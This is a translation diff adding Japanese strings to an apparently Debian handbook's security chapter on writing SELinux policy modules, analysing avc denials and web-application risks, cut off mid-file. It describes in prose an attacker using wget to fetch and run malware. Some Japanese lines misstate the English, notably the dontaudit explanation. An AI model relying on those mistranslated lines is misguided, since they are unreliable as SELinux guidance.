+"# MCS categories: &lt;none&gt;\n"
+"\n"
+"/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Writing a <filename>.if</filename> File"
-msgstr ""
+msgstr "<filename>.if</filename> ファイルの書き方"
 
 #. Tag: para
 #, no-c-format
 msgid "In the sample below, the first interface (“<literal>myapp_domtrans</literal>”) controls who can execute the application. The second one (“<literal>myapp_read_log</literal>”) grants read rights on the application's log files."
-msgstr ""
+msgstr "以下の例では、1 番目のインターフェイス (「<literal>myapp_domtrans</literal>」) はアプリケーションを実行できるユーザを制御します。2 番目のインターフェイス (「<literal>myapp_read_log</literal>」) はアプリケーションのログファイルに対する読み込み権限を制御します。"
 
 #. Tag: para
 #, no-c-format
 msgid "Each interface must generate a valid set of rules which can be embedded in a <filename>.te</filename> file. You should thus declare all the types that you use (with the <literal>gen_require</literal> macro), and use standard directives to grant rights. Note, however, that you can use interfaces provided by other modules. The next section will give more explanations about how to express those rights."
-msgstr ""
+msgstr "それぞれのインターフェイスは <filename>.te</filename> ファイルに組み込むことが可能な有効なルール群を生成しなければいけません。そんなわけで、管理者は (<literal>gen_require</literal> マクロを使って) 使用する全てのタイプを宣言し、権限を取得するために標準的な指示文を使うべきです。しかしながら、他のモジュールが提供するインターフェイスを使う事が可能な点に注意してください。次の節では、これらの権限を表現する方法についてより詳しく説明します。"
 
 #. Tag: title
 #, no-c-format
 msgid "<filename>example.if</filename> File"
-msgstr ""
+msgstr "<filename>example.if</filename> ファイル"
 
 #. Tag: programlisting
 #, no-c-format
@@ -1539,46 +1613,96 @@ msgid ""
 "        allow $1 myapp_log_t:file r_file_perms;\n"
 "')\n"
 msgstr ""
+"## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
+"## &lt;desc&gt;\n"
+"##      &lt;p&gt;\n"
+"##              More descriptive text about myapp.  The &lt;desc&gt;\n"
+"##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;\n"
+"##              html tags for formatting.\n"
+"##      &lt;/p&gt;\n"
+"##      &lt;p&gt;\n"
+"##              This policy supports the following myapp features:\n"
+"##              &lt;ul&gt;\n"
+"##              &lt;li&gt;Feature A&lt;/li&gt;\n"
+"##              &lt;li&gt;Feature B&lt;/li&gt;\n"
+"##              &lt;li&gt;Feature C&lt;/li&gt;\n"
+"##              &lt;/ul&gt;\n"
+"##      &lt;/p&gt;\n"
+"## &lt;/desc&gt;\n"
+"#\n"
+"\n"
+"########################################\n"
+"## &lt;summary&gt;\n"
+"##      Execute a domain transition to run myapp.\n"
+"## &lt;/summary&gt;\n"
+"## &lt;param name=\"domain\"&gt;\n"
+"##      Domain allowed to transition.\n"
+"## &lt;/param&gt;\n"
+"#\n"
+"interface(`myapp_domtrans',`\n"
+"        gen_require(`\n"
+"                type myapp_t, myapp_exec_t;\n"
+"        ')\n"
+"\n"
+"        domtrans_pattern($1,myapp_exec_t,myapp_t)\n"
+"')\n"
+"\n"
+"########################################\n"
+"## &lt;summary&gt;\n"
+"##      Read myapp log files.\n"
+"## &lt;/summary&gt;\n"
+"## &lt;param name=\"domain\"&gt;\n"
+"##      Domain allowed to read the log files.\n"
+"## &lt;/param&gt;\n"
+"#\n"
+"interface(`myapp_read_log',`\n"
+"        gen_require(`\n"
+"                type myapp_log_t;\n"
+"        ')\n"
+"\n"
+"        logging_search_logs($1)\n"
+"        allow $1 myapp_log_t:file r_file_perms;\n"
+"')\n"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>DOCUMENTATION</emphasis> Explanations about the <emphasis>reference policy</emphasis>"
-msgstr ""
+msgstr "<emphasis>DOCUMENTATION</emphasis> <emphasis>リファレンスポリシー</emphasis>に関する説明"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis>reference policy</emphasis> evolves like any free software project: based on volunteer contributions. The project is hosted by Tresys, one of the most active companies in the SELinux field. Their wiki contains explanations on how the rules are structured and how you can create new ones. <ulink type=\"block\" url=\"http://oss.tresys.com/projects/refpolicy/wiki/GettingStarted\" />"
-msgstr ""
+msgstr "SELinux の<emphasis>リファレンスポリシー</emphasis>はフリーソフトウェアプロジェクトのように発展しています: ボランティアからの貢献が発展を支えています。このプロジェクトは Tresys によってホストされています。Tresys は SELinux 分野における最も活発な企業の 1 つです。Tresys の wiki には、ルールを構築する方法と新しいルールを作成する方法が説明されています。<ulink type=\"block\" url=\"http://oss.tresys.com/projects/refpolicy/wiki/GettingStarted\" />"
 
 #. Tag: title
 #, no-c-format
 msgid "Writing a <filename>.te</filename> File"
-msgstr ""
+msgstr "<filename>.te</filename> ファイルの書き方"
 
 #. Tag: para
 #, no-c-format
 msgid "Have a look at the <filename>example.te</filename> file:"
-msgstr ""
+msgstr "<filename>example.te</filename> を見てみましょう:"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> The <command>m4</command> macro language"
-msgstr ""
+msgstr "<emphasis>GOING FURTHER</emphasis> <command>m4</command> マクロ言語"
 
 #. Tag: para
 #, no-c-format
 msgid "To properly structure the policy, the SELinux developers used a macro-command processor. Instead of duplicating many similar <emphasis>allow</emphasis> directives, they created “macro functions” to use a higher-level logic, which also results in a much more readable policy."
-msgstr ""
+msgstr "適切にポリシーを構築するために、SELinux 開発者はマクロコマンドプロセッサを使いました。沢山の類似した <emphasis>allow</emphasis> 指示文を複製する代わりに、SELinux 開発者は高レベル論理を取り扱う「マクロ関数」を作成しました。「マクロ関数」のお陰で、ポリシーがとても読みやすくなりました。"
 
 #. Tag: para
 #, no-c-format
 msgid "In practice, <command>m4</command> is used to compile those rules. It does the opposite operation: it expands all those high-level directives into a huge database of <emphasis>allow</emphasis> directives."
-msgstr ""
+msgstr "具体的に言えば、<command>m4</command> はルールをまとめるために使われます。マクロ関数は反対の操作を行います: マクロ関数は全ての高レベル指示文を <emphasis>allow</emphasis> 指示文の巨大データベースに展開します。"
 
 #. Tag: para
 #, no-c-format
 msgid "The SELinux “interfaces” are only macro functions which will be substituted by a set of rules at compilation time. Likewise, some rights are in fact sets of rights which are replaced by their values at compilation time."
-msgstr ""
+msgstr "SELinux 「インターフェイス」はコンパイル時にルールの集合に置換されるただのマクロ関数です。同様に、実際のところ、幾つかの権限はコンパイル時に権限の値に置換される権限の集合に過ぎません。"
 
 #. Tag: programlisting
 #, no-c-format
@@ -1611,456 +1735,483 @@ msgid ""
 "allow myapp_t myapp_tmp_t:file manage_file_perms;\n"
 "files_tmp_filetrans(myapp_t,myapp_tmp_t,file)\n"
 msgstr ""
+"policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
+"\n"
+"########################################\n"
+"#\n"
+"# Declarations\n"
+"#\n"
+"\n"
+"type myapp_t; <co id=\"example.te.type\"></co>\n"
+"type myapp_exec_t;\n"
+"domain_type(myapp_t)\n"
+"domain_entry_file(myapp_t, myapp_exec_t) <co id=\"example.te.domain\"></co>\n"
+"\n"
+"type myapp_log_t;\n"
+"logging_log_file(myapp_log_t) <co id=\"example.te.interface\"></co>\n"
+"\n"
+"type myapp_tmp_t;\n"
+"files_tmp_file(myapp_tmp_t)\n"
+"\n"
+"########################################\n"
+"#\n"
+"# Myapp local policy\n"
+"#\n"
+"\n"
+"allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id=\"example.te.allow\"></co>\n"
+"\n"
+"allow myapp_t myapp_tmp_t:file manage_file_perms;\n"
+"files_tmp_filetrans(myapp_t,myapp_tmp_t,file)\n"
 
 #. Tag: para
 #, no-c-format
 msgid "The module must be identified by its name and version number. This directive is required."
-msgstr ""
+msgstr "モジュールは名前とバージョン番号で識別されます。この指示文は必須です。"
 
 #. Tag: para
 #, no-c-format
 msgid "If the module introduces new types, it must declare them with directives like this one. Do not hesitate to create as many types as required rather than granting too many useless rights."
-msgstr ""
+msgstr "モジュールによって新しいタイプが導入される場合、この種の指示文を使って新しいタイプを必ず宣言してください。多くの無駄な権限を与えるのでなく、必要な多くのタイプを作成してください。遠慮はいりません。"
 
 #. Tag: para
 #, no-c-format
 msgid "Those interfaces define the <literal>myapp_t</literal> type as a process domain that should be used by any executable labeled with <literal>myapp_exec_t</literal>. Implicitly, this adds an <literal>exec_type</literal> attribute on those objects, which in turn allows other modules to grant rights to execute those programs: for instance, the <literal>userdomain</literal> module allows processes with domains <literal>user_t</literal>, <literal>staff_t</literal>, and <literal>sysadm_t</literal> to execute them. The domains of other confined applications will not have the rights to execute them, unless the rules grant them similar rights (this is the case, for example, of <command>dpkg</command> with its <literal>dpkg_t</literal> domain)."
-msgstr ""
+msgstr "これらのインターフェイスは <literal>myapp_exec_t</literal> ラベルを付けられた実行ファイルによって使われるプロセスドメインとして <literal>myapp_t</literal> タイプを定義します。暗黙のうちに、これはオブジェクトに <literal>exec_type</literal> 属性を追加します。このおかげで、他のモジュールは <literal>myapp_exec_t</literal> ラベルを付けられたプログラムを実行する権限を取得することが可能になります: 例えば、<literal>userdomain</literal> モジュールを使うことで、<literal>user_t</literal>、<literal>staff_t</literal>、<literal>sysadm_t</literal> ドメインを持つプロセスは自分を実行することが可能になります。他の閉じ込められたアプリケーションのドメインは、そのドメインに割り当てられたルールが同様の権限を取得しない限り (例えば <literal>dpkg_t</literal> ドメインを持つ <command>dpkg</command> がこの場合に相当します)、<literal>myapp_exec_t</literal> ラベルを付けられたプログラムを実行する権限を持ちません。"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>logging_log_file</literal> is an interface provided by the reference policy. It indicates that files labeled with the given type are log files which ought to benefit from the associated rules (for example granting rights to <command>logrotate</command> so that it can manipulate them)."
-msgstr ""
+msgstr "<literal>logging_log_file</literal> はリファレンスポリシーによって提供されるインターフェイスです。これは指定されたタイプでラベル付けされたファイルはタイプに対応するルールから恩恵を受ける義務があるログファイルであることを表します (例えば、<command>logrotate</command> がログファイルを処理することを可能にするために、<command>logrotate</command> に権限を与えます)。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>allow</literal> directive is the base directive used to authorize an operation. The first parameter is the process domain which is allowed to execute the operation. The second one defines the object that a process of the former domain can manipulate. This parameter is of the form “<replaceable>type</replaceable>:<replaceable>class</replaceable>“ where <replaceable>type</replaceable> is its SELinux type and <replaceable>class</replaceable> describes the nature of the object (file, directory, socket, fifo, etc.). Finally, the last parameter describes the permissions (the allowed operations)."
-msgstr ""
+msgstr "<literal>allow</literal> 指示文は操作を許可するために使われる基本的な指示文です。1 番目のパラメータはこの操作を実行することを許されたプロセスドメインです。2 番目のパラメータは 1 番目のパラメータはで指定したドメインのプロセスが操作することが可能なオブジェクトを定義します。2 番目のパラメータは「<replaceable>type</replaceable>:<replaceable>class</replaceable>」の形で定義します。ここで <replaceable>type</replaceable> は SELinux タイプで <replaceable>class</replaceable> はオブジェクトの種類 (ファイル、ディレクトリ、ソケット、名前付きパイプなど) です。最後に、3 番目のパラメータはパーミッション (許可された操作) を表現します。"
 
 #. Tag: para
 #, no-c-format
 msgid "Permissions are defined as the set of allowed operations and follow this template: <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. However, you can also use macros representing the most useful permissions. The <filename>/usr/share/selinux/default/include/support/obj_perm_sets.spt</filename> lists them."
-msgstr ""
+msgstr "パーミッションは許可された操作の一式として定義され、以下のテンプレートに従います: <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>。しかしながら、最も役に立つパーミッションを表すマクロを使うことも可能です。<filename>/usr/share/selinux/default/include/support/obj_perm_sets.spt</filename> には、利用可能なパーミッションのマクロが説明されています。"
 
 #. Tag: para
 #, no-c-format
 msgid "The following web page provides a relatively exhaustive list of object classes, and permissions that can be granted. <ulink type=\"block\" url=\"http://www.selinuxproject.org/page/ObjectClassesPerms\" />"
-msgstr ""
+msgstr "以下のウェブページでは、オブジェクトクラスと取得されるパーミッションの比較的包括的なリストが載せられています。<ulink type=\"block\" url=\"http://www.selinuxproject.org/page/ObjectClassesPerms\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "Now you just have to find the minimal set of rules required to ensure that the target application or service works properly. To achieve this, you should have a good knowledge of how the application works and of what kind of data it manages and/or generates."
-msgstr ""
+msgstr "そして、対象のアプリケーションやサービスが正しく動くために必要な最低限のルールセットを見つけ出さなければいけません。これを行うには、アプリケーションの動作方法とアプリケーションが管理および生成するデータの種類に関する詳しい知識が必要です。"
 
 #. Tag: para
 #, no-c-format
 msgid "However, an empirical approach is possible. Once the relevant objects are correctly labeled, you can use the application in permissive mode: the operations that would be forbidden are logged but still succeed. By analyzing the logs, you can now identify the operations to allow. Here is an example of such a log entry:"
-msgstr ""
+msgstr "しかしながら、経験的なアプローチが使えます。対応するオブジェクトに対する正しいラベル付けが終わっていれば、アプリケーションを permissive モードで使う事が可能です: permissive モードでは、禁止されるであろう操作はログ記録されて実行されます。このログを解析することで、許可する操作を識別することが可能になります。以下は permissive モードでアプリケーションを動かした場合に記録されるログエントリの例です。"
 
 #. Tag: programlisting
 #, no-c-format
 msgid "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file\n"
-msgstr ""
+msgstr "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file\n"
 
 #. Tag: para
 #, no-c-format
 msgid "To better understand this message, let us study it piece by piece."
-msgstr ""
+msgstr "このメッセージをより詳しく理解するために、それぞれの要素について勉強しましょう。"
 
 #. Tag: title
 #, no-c-format
 msgid "Analysis of an SELinux trace"
-msgstr ""
+msgstr "SELinux メッセージの解析"
 
 #. Tag: entry
 #, no-c-format
 msgid "Message"
-msgstr ""
+msgstr "メッセージ"
 
 #. Tag: entry
 #, no-c-format
 msgid "Description"
-msgstr ""
+msgstr "説明"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>avc: denied</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>avc: denied</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "An operation has been denied."
-msgstr ""
+msgstr "操作が拒否されました。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>{ read write }</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>{ read write }</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "This operation required the <literal>read</literal> and <literal>write</literal> permissions."
-msgstr ""
+msgstr "この操作には <literal>read</literal> と <literal>write</literal> パーミッションが必要です。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>pid=1876</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>pid=1876</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The process with PID 1876 executed the operation (or tried to execute it)."
-msgstr ""
+msgstr "PID 1876 のプロセスがこの操作を実行しました (または実行を試行しました)。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>comm=\"syslogd\"</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>comm=\"syslogd\"</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The process was an instance of the <literal>syslogd</literal> program."
-msgstr ""
+msgstr "プロセスは <literal>syslogd</literal> プログラムのインスタンスです。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>name=\"xconsole\"</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>name=\"xconsole\"</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The target object was named <literal>xconsole</literal>."
-msgstr ""
+msgstr "対象のオブジェクトは <literal>xconsole</literal> と名付けられていました。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>dev=tmpfs</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>dev=tmpfs</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “hda3”)."
-msgstr ""
+msgstr "対象のオブジェクトをホストしているデバイスは <literal>tmpfs</literal> (メモリ内ファイルシステム) です。実ディスクの場合、オブジェクトをホストしているパーティション (例:「hda3」) になります。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>ino=5510</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>ino=5510</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The object is identified by the inode number 5510."
-msgstr ""
+msgstr "オブジェクトは inode 番号 5510 で識別されています。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "This is the security context of the process who executed the operation."
-msgstr ""
+msgstr "これは操作を実行したプロセスのセキュリティコンテキストです。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "This is the security context of the target object."
-msgstr ""
+msgstr "これは対象オブジェクトのセキュリティコンテキストです。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>tclass=fifo_file</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>tclass=fifo_file</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The target object is a FIFO file."
-msgstr ""
+msgstr "対象オブジェクトは FIFO ファイルです。"
 
 #. Tag: para
 #, no-c-format
 msgid "By observing this log entry, it is possible to build a rule that would allow this operation. For example: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. This process can be automated, and it's exactly what the <command>audit2allow</command> command (of the <emphasis role=\"pkg\">policycoreutils</emphasis> package) offers. This approach is only useful if the various objects are already correctly labeled according to what must be confined. In any case, you will have to carefully review the generated rules and validate them according to your knowledge of the application. Effectively, this approach tends to grant more rights than are really required. The proper solution is often to create new types and to grant rights on those types only. It also happens that a denied operation isn't fatal to the application, in which case it might be better to just add a “<literal>dontaudit</literal>” rule to avoid the log entry despite the effective denial."
-msgstr ""
+msgstr "ログエントリを観察することで、その操作を許可するために必要なルールを構築することが可能です。例: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>。この作業は自動化することが可能です。これが (<emphasis role=\"pkg\">policycoreutils</emphasis> パッケージに含まれる) <command>audit2allow</command> コマンドの役割です。設定する必要のある内容に応じて、様々なオブジェクトが既に正しくラベル付けされている場合にのみ、このアプローチは役に立ちます。いずれにせよ、管理者は必ず、生成されたルールを注意深く確認し、アプリケーションに対する知識に基いてルールの妥当性を検査しなければいけません。事実上、このアプローチはアプリケーションが本当に必要としている権限よりも多くの権限を与えようとします。殆どの場合、新しいタイプを作成し、作成したタイプだけに権限を与えることが適切な解決策と言えます。また、拒否された操作がアプリケーションにとって致命的でない場合もあります。この場合、「<literal>dontaudit</literal>」ルールを追加するだけに留めることがより良い解決策かもしれません。こうすることで、実際の実行を拒否するのではなくログエントリの記録だけが拒否されます。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>COMPLEMENTS</emphasis> No roles in policy rules"
-msgstr ""
+msgstr "<emphasis>COMPLEMENTS</emphasis> ロールを設定されていないポリシールール"
 
 #. Tag: para
 #, no-c-format
 msgid "It might seem weird that roles do not appear at all when creating new rules. SELinux uses only the domains to find out which operations are allowed. The role intervenes only indirectly by allowing the user to switch to another domain. SELinux is based on a theory known as <emphasis>Type Enforcement</emphasis> and the type is the only element that matters when granting rights. <indexterm><primary>Type Enforcement</primary></indexterm> <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>"
-msgstr ""
+msgstr "新しいルールを作成した際に、ロールが 1 つも設定されていないことは不思議に見えるかもしれません。SELinux は許されている操作の見つかったドメインだけを使います。ロールは、ユーザが他のドメインに切り替えることを許可することで、間接的に介在するだけです。SELinux は <emphasis>Type Enforcement</emphasis> として知られる理論に基づき、タイプは権限を獲得する際に考慮される唯一の要素です。<indexterm><primary>Type Enforcement</primary></indexterm> <indexterm><primary>強制、Type Enforcement</primary></indexterm>"
 
 #. Tag: title
 #, no-c-format
 msgid "Compiling the Files"
-msgstr ""
+msgstr "ファイルのコンパイル"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the 3 files (<filename>example.if</filename>, <filename>example.fc</filename>, and <filename>example.te</filename>) match your expectations for the new rules, just run <command>make</command> to generate a module in the <filename>example.pp</filename> file (you can immediately load it with <command>semodule -i example.pp</command>). If several modules are defined, <command>make</command> will create all the corresponding <filename>.pp</filename> files."
-msgstr ""
+msgstr "3 個のファイル (<filename>example.if</filename>、<filename>example.fc</filename>、<filename>example.te</filename>) が新しいルールに関する管理者の期待と一致したら、<filename>example.pp</filename> ファイルの中で <command>make</command> を実行してモジュールを生成します (<command>semodule -i example.pp</command> を使ってすぐさまこのモジュールを読み込むことが可能です)。復数のモジュールを定義した場合、<command>make</command> は全ての対応する <filename>.pp</filename> ファイルを生成します。"
 
 #. Tag: title
 #, no-c-format
 msgid "Other Security-Related Considerations"
-msgstr ""
+msgstr "セキュリティ関連で他に考慮すべき点"
 
 #. Tag: para
 #, no-c-format
 msgid "Security is not just a technical problem; more than anything, it's about good practices and understanding the risks. This section reviews some of the more common risks, as well as a few best practices which should, depending on the case, increase security or lessen the impact of a successful attack."
-msgstr ""
+msgstr "セキュリティとは単なる技術的問題ではありません; セキュリティに関してもっとも重要なことは、良く練習すること、危険を理解すること、です。この節では、幾つかのより一般的な危険および最良の実践例を見直します。ここで挙げた事例を実践することで、セキュリティを向上させたり、攻撃が成功してもその影響を小さなものにする事が可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "Inherent Risks of Web Applications"
-msgstr ""
+msgstr "ウェブアプリケーションに備わっている潜在的危険性"
 
 #. Tag: para
 #, no-c-format
 msgid "The universal character of web applications led to their proliferation. Several are often run in parallel: a webmail, a wiki, some groupware system, forums, a photo gallery, a blog, and so on. Many of those applications rely on the “LAMP” (<emphasis>Linux, Apache, MySQL, PHP</emphasis>) stack. Unfortunately, many of those applications were also written without much consideration for security problems. Data coming from outside is, too often, used with little or no validation. Providing specially-crafted values can be used to subvert a call to a command so that another one is executed instead. Many of the most obvious problems have been fixed as time has passed, but new security problems pop up regularly."
-msgstr ""
+msgstr "ウェブアプリケーションは、その普遍的特徴のおかげで、数多く開発されました。幾つかのアプリケーションは同時に実行されます: ウェブメール、wiki、グループウェアシステム、フォーラム、写真ギャラリー、ブログ、など。これらのアプリケーションは「LAMP」(<emphasis>Linux、Apache、MySQL、PHP</emphasis>) スタックに頼っています。残念なことに、多くのアプリケーションがセキュリティ問題を深く考えずに書かれています。外部から提供されるデータは、その妥当性を少しだけ検査するか、全く検査せずに使わることが多いです。特別に細工した値をアプリケーションに渡すことで、あるコマンドの代わりに他のコマンドを実行させることが可能です。多くの最も自明な問題は時間が経てば修正されますが、定期的に新しいセキュリティ問題が生じます。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> SQL injection"
-msgstr ""
+msgstr "<emphasis>VOCABULARY</emphasis> SQL インジェクション"
 
 #. Tag: para
 #, no-c-format
 msgid "When a program inserts data into SQL queries in an insecure manner, it becomes vulnerable to SQL injections; this name covers the act of changing a parameter in such a way that the actual query executed by the program is different from the intended one, either to damage the database or to access data that should normally not be accessible. <ulink type=\"block\" url=\"http://en.wikipedia.org/wiki/SQL_Injection\" />"
-msgstr ""
+msgstr "プログラムが安全性に欠けるやり方で SQL クエリにデータを挿入している場合、プログラムは SQL インジェクションに対して脆弱になります;SQL インジェクションとは、パラメータを変更する事で、プログラムが実行する実際のクエリを意図しないものに変える行為を指します。これにより、データベースが破壊されたり、通常は利用不可能なデータへのアクセスを可能にします。<ulink type=\"block\" url=\"http://en.wikipedia.org/wiki/SQL_Injection\" />"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>SQL injection</primary>"
-msgstr ""
+msgstr "<primary>SQL インジェクション</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Updating web applications regularly is therefore a must, lest any cracker (whether a professional attacker or a script kiddy) can exploit a known vulnerability. The actual risk depends on the case, and ranges from data destruction to arbitrary code execution, including web site defacement."
-msgstr ""
+msgstr "このため、定期的なウェブアプリケーションの更新は不可欠です。これは、クラッカー (プロフェッショナルな攻撃者であるかスクリプトキディであるかに関わらず) からの既知の脆弱性を利用した攻撃を防ぐ意味合いがあります。実際のリスクは場合によりますが、データの破壊、任意のコード実行、ウェブサイトの書き換えなどの範囲におよびます。"
 
 #. Tag: title
 #, no-c-format
 msgid "Knowing What To Expect"
-msgstr ""
+msgstr "予測される結果を知る"
 
 #. Tag: para
 #, no-c-format
 msgid "A vulnerability in a web application is often used as a starting point for cracking attempts. What follows is a short review of possible consequences."
-msgstr ""
+msgstr "ウェブアプリケーションの持つ脆弱性はクラッキング行為の足掛かりとして使われることが多いです。以下は、そこから考えられる結果の短い概観を示します。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>QUICK LOOK</emphasis> Filtering HTTP queries"
-msgstr ""
+msgstr "<emphasis>QUICK LOOK</emphasis> HTTP クエリのフィルタ"
 
 #. Tag: para
 #, no-c-format
 msgid "Apache 2 includes modules allowing filtering incoming HTTP queries. This allows blocking some attack vectors. For instance, limiting the length of parameters can prevent buffer overflows. More generally, one can validate parameters before they are even passed to the web application and restrict access along many criteria. This can even be combined with dynamic firewall updates, so that a client infringing one of the rules is banned from accessing the web server for a given period of time."
-msgstr ""
+msgstr "Apache 2 には、入って来る HTTP クエリをフィルタするモジュールが含まれています。このモジュールを使うことで、幾つかの攻撃ベクトルを妨害することが可能です。例えば、パラメータの長さに制限を設けることで、バッファオーバーフローを避ける事が可能です。より一般的に言えば、ウェブアプリケーションにパラメータを渡す前にパラメータの妥当性を検査させ、アクセスに制限を加える事が可能です。これを動的なファイヤーウォールの更新に統合することが可能です。こうすることで、ルールを破ったクライアントは、指定された期間ウェブサーバへのアクセスを禁止される事になります。"
 
 #. Tag: para
 #, no-c-format
 msgid "Setting up these checks can be a long and cumbersome task, but it can pay off when the web application to be deployed has a dubious track record where security is concerned."
-msgstr ""
+msgstr "この種のフィルタを設定することは長く厄介な作業ですが、配備予定のウェブアプリケーションのセキュリティに関する実績が疑わしい場合、効果があります。"
 
 #. Tag: para
 #, no-c-format
 msgid "<emphasis>mod-security</emphasis> (in the <emphasis role=\"pkg\">libapache-mod-security</emphasis> package) is the main such module."
-msgstr ""
+msgstr "<emphasis>mod-security</emphasis> (<emphasis role=\"pkg\">libapache-mod-security</emphasis> パッケージに含まれます) はこの機能を提供する主要なモジュールです。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis role=\"pkg\">libapache-mod-security</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis role=\"pkg\">libapache-mod-security</emphasis></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis>mod-security</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis>mod-security</emphasis></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The consequences of an intrusion will have various levels of obviousness depending on the motivations of the attacker. <emphasis>Script-kiddies</emphasis> only apply recipes they find on web sites; most often, they deface a web page or delete data. In more subtle cases, they add invisible contents to web pages so as to improve referrals to their own sites in search engines."
-msgstr ""
+msgstr "不正侵入に成功した後にどのような事が行われるかは攻撃者のやる気に依存します。<emphasis>スクリプトキディ</emphasis>はウェブサイトで探し出したレシピを適用するだけです; ほとんどんの場合、<emphasis>スクリプトキディ</emphasis>はウェブページを書き換えデータを削除します。より狡猾な<emphasis>スクリプトキディ</emphasis>はウェブページに不可視の内容を追加して、サーチエンジンからみた自分のサイトの推薦順位を向上させます。"
 
 #. Tag: para
 #, no-c-format
 msgid "A more advanced attacker will go beyond that. A disaster scenario could go on in the following fashion: the attacker gains the ability to execute commands as the <literal>www-data</literal> user, but executing a command requires many manipulations. To make their life easier, they install other web applications specially designed to remotely execute many kinds of commands, such as browsing the filesystem, examining permissions, uploading or downloading files, executing commands, and even provide a network shell. Often, the vulnerability will allow running a <command>wget</command> command that will download some malware into <filename>/tmp/</filename>, then executing it. The malware is often downloaded from a foreign website that was previously compromised, in order to cover tracks and make it harder to follow the scent to the actual origin of the attack."
-msgstr ""
+msgstr "更に上級の攻撃者はこれ以上のことを行います。最悪の筋書きは以下の手順で進みます: 攻撃者は <literal>www-data</literal> ユーザ権限でコマンドを実行する能力を取得しますが、コマンドを実行するには数多くの操作が必要です。実行を簡単にするために、攻撃者はリモートから様々なコマンドを実行する専用に設計された他のウェブアプリケーションをインストールします。このアプリケーションを使うことで、ファイルシステムを閲覧したり、パーミッションを検査したり、ファイルをアップロードおよびダウンロードしたり、ネットワークシェルを提供したりする事が可能になります。しばしば、脆弱性を使って、<command>wget</command> コマンドを使ってマルウェアを <filename>/tmp/</filename> にダウンロードし、マルウェアを実行することが可能になります。このマルウェアは既に不正侵入されている別のウェブサイトからダウンロードされます。こうすることで、攻撃者の痕跡が無くなり、実際の攻撃元に関するヒントを辿ることが難しくなります。"
 
 #. Tag: para
 #, no-c-format
